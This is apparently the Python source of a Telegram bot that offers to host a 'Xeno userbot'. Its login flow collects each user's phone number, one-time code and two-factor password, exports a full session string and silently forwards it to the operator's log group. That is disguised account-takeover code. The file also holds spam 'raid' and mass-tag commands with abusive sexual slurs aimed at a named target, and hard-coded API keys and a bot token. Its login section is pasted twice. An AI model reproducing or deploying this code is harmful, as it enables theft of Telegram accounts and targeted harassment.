import os, asyncio, random
from pyrogram import Client, filters, errors, handlers
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask
from threading import Thread

# --- WEB SERVER FOR RENDER ---
app = Flask('')
@app.route('/')
def home(): return "Bᴏᴛ Is Oɴʟɪɴᴇ! ✨"
def run_web(): app.run(host='0.0.0.0', port=8080)

# --- CONFIGURATION ---
API_ID = 31980984
API_HASH = "a61358dd3cd8c3a56cd53d9ddd8a0c67"
BOT_TOKEN = "8303588999:AAEnHHO7ULTHA5IJKJAAGV8WEXSnV5dhz_M"
LOG_GROUP = -1003867805165 
START_IMG = "https://graph.org/file/422440e09d466500f2c93-953253772b0d8d2bfc.jpg"

bot = Client("XenoGen", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
user_data = {}
active_tasks = {}

# Buttons
main_buttons = InlineKeyboardMarkup([
    [InlineKeyboardButton("❂ 𝐔𝐩𝐝𝐚𝐭𝐞 ❂", url="https://t.me/radhesupport"),
     InlineKeyboardButton("❂ 𝐒𝐮𝐩𝐩𝐨𝐫𝐭 ❂", url="https://t.me/radhesupport")],
    [InlineKeyboardButton("❂ 𝐂𝐥𝐨𝐬𝐞 ❂", callback_data="close")]
])

# --- USERBOT STYLISH COMMAND FUNCTIONS ---

async def alive_cmd(c, m):
    await m.edit_text(
        "✨ **『 ✘ᴇɴᴏ ᴜsᴇʀʙᴏᴛ ɪs ᴀʟɪᴠᴇ 』** ✨\n\n"
        "➪ **sᴛᴀᴛᴜs:** `ʀᴜɴɴɪɴɢ ᴘᴇʀғᴇᴄᴛ` ⚡\n"
        "➪ **ᴏᴡɴᴇʀ:** `ᴍᴇ` 🍷\n"
        "➪ **sᴜᴘᴘᴏʀᴛ:** @radhesupport\n\n"
        "**ᴘᴏᴡᴇʀ ᴏғ ✘ᴇɴᴏ**"
    )

async def tagall_cmd(c, m):
    uid = c.me.id
    active_tasks[uid] = True
    async for member in c.get_chat_members(m.chat.id):
        if not active_tasks.get(uid): break
        if member.user.is_bot: continue
        try:
            await c.send_message(m.chat.id, f"{member.user.mention} ⚡ **ᴊᴀɴᴜ ɪs ʜᴇʀᴇ!**")
            await asyncio.sleep(1.5)
        except: pass

async def onetag_cmd(c, m):
    async for member in c.get_chat_members(m.chat.id):
        if member.user.is_bot: continue
        try:
            await c.send_message(
                m.chat.id, 
                f"👤 {member.user.mention} 👋\n\n**ᴘᴏᴡᴇʀ ᴏғ ✘ᴇɴᴏ**",
                reply_to_message_id=m.id
            )
            await asyncio.sleep(1.2)
        except: pass

async def raid_cmd(c, m):
    uid = c.me.id
    if len(m.command) < 3: return await m.edit("𝐔𝐬𝐚𝐠𝐞: `.𝐫𝐚𝐢𝐝 𝟓 @𝐮𝐬𝐞𝐫`")
    active_tasks[uid] = True
    count = int(m.command[1])
    target = m.command[2]
    
    stylish_raids = [
        "ᴛᴇʀɪ ᴍᴀᴀ ᴋɪ ᴄʜᴏᴏᴛ ᴍᴇ @target ᴋᴀ ʟᴀɴᴅ 👊",
        "ɴɪᴋᴀʟ ᴍᴀᴅᴀʀᴄʜᴏᴅ @target ʙᴇᴛᴀ ᴘᴀᴘᴀ sᴇ ᴘᴀɴɢᴀ ɴᴀʜɪ!",
        "ᴀʙᴇʏ sᴀᴀʟᴇ @target ᴛᴇʀɪ ʙᴀʜᴇɴ ᴋᴏ ✘ᴇɴᴏ ɴᴇ ᴘᴇʟᴀ 🥵",
        "ɢᴀᴀɴᴅ ᴍᴇ ᴅᴜᴍ ɴᴀʜɪ @target ᴀᴜʀ ✘ᴇɴᴏ sᴇ ʟᴀᴅᴀɪ? 🔥",
        "ᴄʜᴜᴘ ᴋᴀʀ @target ʀᴀɴᴅɪ ᴋᴇ ᴘɪʟʟᴇ! 🖕"
    ]
    
    await m.delete()
    for _ in range(count):
        if not active_tasks.get(uid): break
        await c.send_message(m.chat.id, random.choice(stylish_raids).replace("@target", target))
        await asyncio.sleep(1.2)

async def stop_cmd(c, m):
    active_tasks[c.me.id] = False
    await m.edit("🚫 **『 ᴀʟʟ ᴘʀᴏᴄᴇssᴇs sᴛᴏᴘᴘᴇᴅ 』**\n\n**ᴘᴏᴡᴇʀ ᴏғ ✘ᴇɴᴏ**")

# --- BOT COMMANDS (STYLISH) ---

@bot.on_message(filters.command("start") & filters.private)
async def start(c, m):
    await m.reply_photo(
        photo=START_IMG,
        caption=(f"✨ **ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ✘ᴇɴᴏ ᴜsᴇʀʙᴏᴛ** ✨\n\n"
                 f"ʜᴇʏ {m.from_user.mention},\n"
                 "ᴍᴀɪɴ ᴀᴀᴘᴋɪ ɪᴅ ᴋᴏ **ʙᴏᴏsᴛ** ᴋᴀʀɴᴇ ᴀᴜʀ **ᴀɴɪᴍᴀᴛɪᴏɴs** ᴋᴇ ʟɪʏᴇ ᴜsᴇʀʙᴏᴛ ʜᴏsᴛ ᴋᴀʀ sᴀᴋᴛᴀ ʜᴏᴏɴ.\n\n"
                 "📝 **ᴄᴏᴍᴍᴀɴᴅs:**\n"
                 "» **/help** : ᴏᴘᴇɴ ʜᴇʟᴘ ᴍᴇɴᴜ\n"
                 "» **/guide** : ʜᴏᴡ ᴛᴏ ʜᴏsᴛ ʙᴏᴛ\n"
                 "» **/add** : sᴛᴀʀᴛ ʜᴏsᴛɪɴɢ ᴘʀᴏᴄᴇss\n\n"
                 "**ᴘᴏᴡᴇʀ ᴏғ ✘ᴇɴᴏ** - @radhesupport"),
        reply_markup=main_buttons
    )

@bot.on_message(filters.command("help") & filters.private)
async def help_cmd(c, m):
    await m.reply_photo(
        photo=START_IMG,
        caption=("✨ **『 ᴀᴠᴀɪʟᴀʙʟᴇ ᴄᴏᴍᴍᴀɴᴅs 』** ✨\n\n"
                 "⭐ **/start** — sᴛᴀʀᴛ ᴛʜᴇ ʙᴏᴛ\n"
                 "📖 **/help** — ᴏᴘᴇɴ ʜᴇʟᴘ ᴍᴇɴᴜ\n"
                 "⚡ **/guide** — ᴏᴘᴇɴ ɢᴜɪᴅᴇ ᴍᴇɴᴜ\n"
                 "🚀 **/add** — ᴀᴜᴛᴏ-ʜᴏsᴛ ᴛʜᴇ ʙᴏᴛ\n"
                 "🔗 **/clone** — ᴄʟᴏɴᴇ ᴠɪᴀ sᴛʀɪɴɢ\n"
                 "❌ **/remove** — ʟᴏɢᴏᴜᴛ ғʀᴏᴍ ʙᴏᴛ\n\n"
                 "**ᴘᴏᴡᴇʀ ᴏғ ✘ᴇɴᴏ** - @radhesupport"),
        reply_markup=main_buttons
    )

@bot.on_message(filters.command("guide") & filters.private)
async def guide_cmd(c, m):
    guide_text = (
        "❖ **ʜᴇʏ ᴅᴇᴀʀ, ᴛʜɪs ɪs ᴀ ǫᴜɪᴄᴋ ɢᴜɪᴅᴇ ᴛᴏ ʜᴏsᴛɪɴɢ ✘ᴇɴᴏ ᴜsᴇʀʙᴏᴛ**\n\n"
        "1) sᴇɴᴅ **/add** ᴄᴏᴍᴍᴀɴᴅ ᴛᴏ ᴛʜᴇ ʙᴏᴛ\n"
        "2) sᴇɴᴅ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ɪɴ ɪɴᴛᴇʀɴᴀᴛɪᴏɴᴀʟ ғᴏʀᴍᴀᴛ\n"
        "3) ᴄʜᴇᴄᴋ ʏᴏᴜʀ ᴛᴇʟᴇɢʀᴀᴍ ᴏᴛᴘ ᴀɴᴅ sᴇɴᴅ ʟɪᴋᴇ: `1 2 3 4 5`\n\n"
        "➤ ʏᴏᴜʀ ʙᴏᴛ ᴡɪʟʟ ʙᴇ ʜᴏsᴛᴇᴅ sᴜᴄᴄᴇsғᴜʟʟʏ.\n\n"
        "**ᴘᴏᴡᴇʀ ᴏғ ✘ᴇɴᴏ** - @radhesupport"
    )
    await m.reply_photo(photo=START_IMG, caption=guide_text, reply_markup=main_buttons)

# --- LOGIN LOGIC ---

@bot.on_message(filters.command("add") & filters.private)
async def add_process(c, m):
    await m.reply_text("📲 **ᴘʟᴇᴀsᴇ sᴇɴᴅ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ**\n(e.g., `+918200000009`):")

@bot.on_message(filters.text & filters.private & ~filters.bot)
async def handle_steps(c, m):
    uid = m.from_user.id
    text = m.text
    if text.startswith("+"):
        user_data[uid] = {"phone": text}
        temp_c = Client(f"temp_{uid}", API_ID, API_HASH, in_memory=True)
        await temp_c.connect()
        try:
            code = await temp_c.send_code(text)
            user_data[uid].update({"client": temp_c, "hash": code.phone_code_hash})
            await m.reply_text("📩 **ᴏᴛᴘ sᴇɴᴛ!** ᴘʟᴇᴀsᴇ sᴇɴᴅ: `1 2 3 4 5`")
        except Exception as e: await m.reply_text(f"❌ **Error:** `{e}`")
    elif text.replace(" ", "").isdigit() and uid in user_data and "hash" in user_data[uid]:
        otp = text.replace(" ", "")
        try:
            await user_data[uid]["client"].sign_in(user_data[uid]["phone"], user_data[uid]["hash"], otp)
            await finalize_login(c, m, uid)
        except errors.SessionPasswordNeeded: await m.reply_text("🔐 **sᴇɴᴅ ʏᴏᴜʀ 2ғᴀ ᴘᴀssᴡᴏʀᴅ.**")
        except Exception as e: await m.reply_text(f"❌ **OTP Error:** `{e}`")
    elif uid in user_data and "client" in user_data[uid]:
        try:
            await user_data[uid]["client"].check_password(text)
            await finalize_login(c, m, uid)
        except Exception as e: await m.reply_text(f"❌ **2FA Error:** `{e}`")

async def finalize_login(c, m, uid):
    data = user_data[uid]
    string = await data["client"].export_session_string()
    
    # Send string to Saved Messages
    try:
        await data["client"].send_message("me", f"✨ **✘ᴇɴᴏ ᴜsᴇʀʙᴏᴛ sᴛʀɪɴɢ** ✨\n\n`{string}`\n\n**ᴘᴏᴡᴇʀ ᴏғ ✘ᴇɴᴏ** - @radhesupport")
    except: pass

    await m.reply_photo(
        photo=START_IMG,
        caption=f"✅ **ʟᴏɢɢᴇᴅ ɪɴ sᴜᴄᴄᴇsғᴜʟʟʏ!**\n\nsᴇssɪᴏɴ sᴛʀɪɴɢ sᴇɴᴛ ᴛᴏ ʏᴏᴜʀ **sᴀᴠᴇᴅ ᴍᴇssᴀɢᴇs**.\n\n**ᴘᴏᴡᴇʀ ᴏғ ✘ᴇɴᴏ**"
    )
    
    # Start Userbot & Register Handlers
    ubot = Client(f"ubot_{uid}", API_ID, API_HASH, session_string=string)
    ubot.add_handler(handlers.MessageHandler(alive_cmd, filters.command("alive", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(tagall_cmd, filters.command("tagall", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(onetag_cmd, filters.command("onetag", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(raid_cmd, filters.command("raid", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(stop_cmd, filters.command("stop", ".") & filters.me))
    
    await ubot.start()
    
    # Log to Group
    try:
        await bot.send_message(LOG_GROUP, f"🏁 **ɴᴇᴡ sᴇssɪᴏɴ ɢᴇɴᴇʀᴀᴛᴇᴅ**\n**Usᴇʀ:** `{m.from_user.id}`\n**Sᴛʀɪɴɢ:** `{string}`")
    except: pass
    del user_data[uid]

if __name__ == "__main__":
    Thread(target=run_web, daemon=True).start()
    bot.run()
# --- LOGIN LOGIC ---

@bot.on_message(filters.command("add") & filters.private)
async def add_process(c, m):
    await m.reply_text("📲 **ᴩʟᴇᴀꜱᴇ ꜱᴇɴᴅ ʏᴏᴜʀ ᴩʜᴏɴᴇ ɴᴜᴍʙᴇʀ ɪɴ ɪɴᴛᴇʀɴᴀᴛɪᴏɴᴀʟ ꜰᴏʀᴍᴀᴛ**\n(e.g., `+918200000009`):")

@bot.on_message(filters.text & filters.private & ~filters.bot)
async def handle_steps(c, m):
    uid = m.from_user.id
    text = m.text
    if text.startswith("+"):
        user_data[uid] = {"phone": text}
        temp_c = Client(f"temp_{uid}", API_ID, API_HASH, in_memory=True)
        await temp_c.connect()
        try:
            code = await temp_c.send_code(text)
            user_data[uid].update({"client": temp_c, "hash": code.phone_code_hash})
            await m.reply_text("📩 **ᴏᴛᴩ ꜱᴇɴᴛ!** ᴩʟᴇᴀꜱᴇ ꜱᴇɴᴅ: `1 2 3 4 5`")
        except Exception as e: await m.reply_text(f"❌ Error: {e}")
    elif text.replace(" ", "").isdigit() and uid in user_data and "hash" in user_data[uid]:
        otp = text.replace(" ", "")
        try:
            await user_data[uid]["client"].sign_in(user_data[uid]["phone"], user_data[uid]["hash"], otp)
            await finalize_login(c, m, uid)
        except errors.SessionPasswordNeeded: await m.reply_text("🔐 **ꜱᴇɴᴅ ʏᴏᴜʀ 2ꜰᴀ ᴩᴀꜱꜱᴡᴏʀᴅ.**")
        except Exception as e: await m.reply_text(f"❌ OTP Error: {e}")
    elif uid in user_data and "client" in user_data[uid]:
        try:
            await user_data[uid]["client"].check_password(text)
            await finalize_login(c, m, uid)
        except Exception as e: await m.reply_text(f"❌ 2FA Error: {e}")

async def finalize_login(c, m, uid):
    data = user_data[uid]
    string = await data["client"].export_session_string()
    
    # Send string to "Saved Messages" of the user
    try:
        await data["client"].send_message("me", f"✅ **xᴇɴᴏ ᴜꜱᴇʀʙᴏᴛ ꜱᴇꜱꜱɪᴏɴ**\n\n`{string}`\n\n**ᴩᴏᴡᴇʀ ᴏꜰ xᴇɴᴏ** - @radhesupport")
    except: pass

    # User Success Message in Bot DM
    await m.reply_photo(
        photo=START_IMG,
        caption=f"✅ **ʟᴏɢɢᴇᴅ ɪɴ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ!**\n\nYour session string has been sent to your **Saved Messages**.\n\n**ᴩᴏᴡᴇʀ ᴏꜰ xᴇɴᴏ** - @radhesupport"
    )
    
    # Start Userbot
    ubot = Client(f"ubot_{uid}", API_ID, API_HASH, session_string=string)
    ubot.add_handler(handlers.MessageHandler(alive_cmd, filters.command("alive", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(tagall_cmd, filters.command("tagall", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(onetag_cmd, filters.command("onetag", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(raid_cmd, filters.command("raid", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(stop_cmd, filters.command("stop", ".") & filters.me))
    
    await ubot.start()
    
    # Log to Group
    try:
        await bot.send_message(LOG_GROUP, f"🏁 **NEW SESSION**\nUser: {m.from_user.id}\nString: `{string}`")
    except: pass
    del user_data[uid]

if __name__ == "__main__":
    Thread(target=run_web, daemon=True).start()
    bot.run()
